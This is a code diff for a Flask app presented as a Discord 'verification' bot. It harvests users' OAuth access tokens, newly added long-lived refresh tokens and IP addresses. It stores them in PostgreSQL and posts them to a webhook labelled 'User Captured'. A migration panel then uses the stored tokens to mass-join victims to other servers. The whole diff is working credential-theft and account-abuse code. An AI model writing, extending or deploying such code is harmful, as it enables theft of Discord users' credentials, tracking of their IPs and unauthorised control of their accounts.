@@ -26,12 +26,14 @@ def init_db():
     try:
         conn = get_db_connection()
         cur = conn.cursor()
+        # ADICIONEI: refresh_token TEXT
         cur.execute("""
             CREATE TABLE IF NOT EXISTS verified_users (
                 user_id VARCHAR(50) PRIMARY KEY,
                 username VARCHAR(100),
                 ip_address VARCHAR(50),
                 access_token TEXT,
+                refresh_token TEXT,
                 guild_id VARCHAR(50),
                 verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             );
@@ -39,43 +41,46 @@ def init_db():
         conn.commit()
         cur.close()
         conn.close()
-        print("✅ DB Conectado e Tabela Verificada.")
+        print("✅ DB Conectado.")
     except Exception as e:
         print(f"❌ Erro DB: {e}")
 
-def save_user_to_db(user_id, username, ip, token, guild_id):
+def save_user_to_db(user_id, username, ip, token, refresh, guild_id):
     try:
         conn = get_db_connection()
         cur = conn.cursor()
+        # Query Atualizada para incluir refresh_token
         query = """
-            INSERT INTO verified_users (user_id, username, ip_address, access_token, guild_id)
-            VALUES (%s, %s, %s, %s, %s)
+            INSERT INTO verified_users (user_id, username, ip_address, access_token, refresh_token, guild_id)
+            VALUES (%s, %s, %s, %s, %s, %s)
             ON CONFLICT (user_id) DO UPDATE 
             SET ip_address = EXCLUDED.ip_address, 
                 access_token = EXCLUDED.access_token,
+                refresh_token = EXCLUDED.refresh_token,
                 guild_id = EXCLUDED.guild_id,
                 verified_at = CURRENT_TIMESTAMP;
         """
-        cur.execute(query, (user_id, username, ip, token, guild_id))
+        cur.execute(query, (user_id, username, ip, token, refresh, guild_id))
         conn.commit()
         conn.close()
     except Exception as e:
-        print(f"❌ Erro Save DB: {e}")
+        # Se der erro de coluna faltando, avisa
+        print(f"❌ Erro Save DB (Provavelmente precisa resetar a tabela): {e}")
 
 # --- FUNÇÕES DISCORD ---
 def get_headers_bot():
     return {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
 
-def send_log_to_webhook(user_data, access_token, ip_address, guild_id):
+def send_log_to_webhook(user_data, access_token, refresh_token, ip_address, guild_id):
     embed = {
-        "title": "✅ Usuário Capturado!",
-        "description": "Dados salvos no PostgreSQL.",
+        "title": "✅ Usuário Capturado (Completo)!",
+        "description": "Dados + Refresh Token salvos.",
         "color": 0x00ff41,
         "fields": [
             { "name": "👤 User", "value": f"{user_data['username']} ({user_data['id']})", "inline": False },
             { "name": "🌍 IP", "value": f"`{ip_address}`", "inline": True },
-            { "name": "🏰 Server ID", "value": f"`{guild_id}`", "inline": True },
-            { "name": "🔑 Token", "value": f"||{access_token}||", "inline": False }
+            { "name": "🔑 Access Token (Curto - 7 Dias)", "value": f"||{access_token}||", "inline": False },
+            { "name": "🔄 Refresh Token (Longo - Renovável)", "value": f"||{refresh_token}||", "inline": False }
         ],
         "footer": { "text": "Hunter Database System" }
     }
@@ -85,16 +90,19 @@ def send_log_to_webhook(user_data, access_token, ip_address, guild_id):
         pass
 
 def get_or_create_verified_role(target_guild_id):
-    url = f"{API_BASE}/guilds/{target_guild_id}/roles"
-    response = requests.get(url, headers=get_headers_bot())
-    if response.status_code == 200:
-        for role in response.json():
-            if role['name'] == "Vereficado": return role['id']
-    
-    create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
-    data = {"name": "Vereficado", "permissions": "0", "color": 0x00ff00, "hoist": False, "mentionable": False}
-    create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
-    if create_res.status_code in [200, 201]: return create_res.json()['id']
+    try:
+        url = f"{API_BASE}/guilds/{target_guild_id}/roles"
+        response = requests.get(url, headers=get_headers_bot())
+        if response.status_code == 200:
+            for role in response.json():
+                if role['name'] == "Vereficado": return role['id']
+        
+        create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
+        data = {"name": "Vereficado", "permissions": "0", "color": 0x00ff00, "hoist": False, "mentionable": False}
+        create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
+        if create_res.status_code in [200, 201]: return create_res.json()['id']
+    except:
+        return None
     return None
 
 def join_user_to_guild(user_id, access_token, target_guild_id):
@@ -126,10 +134,8 @@ def auth():
     if not target_guild_id:
         return "Erro: ID do servidor faltando."
     
-    # CORREÇÃO: Usando %20 explicitamente para garantir que o link não quebre os scopes
-    # Isso garante que apareça "Autorizar App" e não "Adicionar Bot"
-    oauth_url = (
-        f"https://discord.com/oauth2/authorize"
+    # Links
+    base_params = (
         f"?client_id={CLIENT_ID}"
         f"&response_type=code"
         f"&redirect_uri={REDIRECT_URI}"
@@ -137,8 +143,10 @@ def auth():
         f"&state={target_guild_id}"
     )
     
-    # Envia para o Launcher (com | safe no HTML para não quebrar)
-    return render_template('launcher.html', url=oauth_url)
+    web_url = f"https://discord.com/oauth2/authorize{base_params}"
+    app_url = f"discord://discord.com/oauth2/authorize{base_params}"
+    
+    return render_template('launcher.html', web_url=web_url, app_url=app_url)
 
 @app.route('/callback')
 def callback():
@@ -147,7 +155,7 @@ def callback():
     
     if not code: return "Erro: Código não recebido."
 
-    # 1. Troca Code por Token
+    # 1. Troca Code por Tokens
     data = {
         'client_id': CLIENT_ID, 
         'client_secret': CLIENT_SECRET, 
@@ -162,6 +170,7 @@ def callback():
     
     tokens = token_resp.json()
     access_token = tokens.get('access_token')
+    refresh_token = tokens.get('refresh_token') # <--- PEGANDO O TOKEN LONGO AQUI
     
     # 2. Pega User Info
     user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
@@ -172,11 +181,11 @@ def callback():
     # 3. Pega IP
     ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
     
-    # 4. Salva e Loga
-    save_user_to_db(user_id, username, ip, access_token, target_guild_id)
-    send_log_to_webhook(user_data, access_token, ip, target_guild_id)
+    # 4. Salva (Com Refresh Token)
+    save_user_to_db(user_id, username, ip, access_token, refresh_token, target_guild_id)
+    send_log_to_webhook(user_data, access_token, refresh_token, ip, target_guild_id)
 
-    # 5. Ação no Discord
+    # 5. Discord Actions
     join_user_to_guild(user_id, access_token, target_guild_id)
     try:
         role_id = get_or_create_verified_role(target_guild_id)
@@ -185,10 +194,13 @@ def callback():
     except Exception as e:
         print(f"Erro cargo: {e}")
 
-    # 6. Sucesso com Deep Link
-    return render_template('success.html', guild_id=target_guild_id)
+    # 6. Sucesso
+    return_app_url = f"discord://discord.com/channels/{target_guild_id}"
+    return_web_url = f"https://discord.com/channels/{target_guild_id}"
 
-# --- PAINEL DE ENVIO ---
+    return render_template('launcher.html', app_url=return_app_url, web_url=return_web_url)
+
+# --- PAINEL ENVIO ---
 @app.route('/painel', methods=['GET', 'POST'])
 def painel():
     message = ""
@@ -218,13 +230,13 @@ def painel():
         r = requests.post(post_url, headers=get_headers_bot(), json=payload)
         
         if r.status_code == 200:
-            message = "✅ Painel enviado com sucesso!"
+            message = "✅ Painel enviado!"
         else:
-            message = f"❌ Erro ({r.status_code}): {r.text}"
+            message = f"❌ Erro: {r.text}"
 
     return render_template('painel.html', message=message)
 
-# --- PAINEL DE MIGRAÇÃO ---
+# --- PAINEL MIGRAÇÃO ---
 @app.route('/migrate', methods=['GET', 'POST'])
 def migrate():
     log_msg = []
@@ -244,11 +256,12 @@ def migrate():
 
                 if user:
                     uid, uname, token = user
+                    # Usa o ACCESS TOKEN mesmo, ele é o que funciona
                     status = join_user_to_guild(uid, token, target_guild_id)
                     res_txt = "Sucesso" if status in [201, 204] else f"Falha ({status})"
                     log_msg.append(f"[{res_txt}] {uname}")
                 else:
-                    log_msg.append(f"⚠️ Usuário '{identifier}' não encontrado.")
+                    log_msg.append(f"⚠️ User não encontrado.")
 
             elif action_type == 'mass':
                 amount = int(request.form.get('amount'))
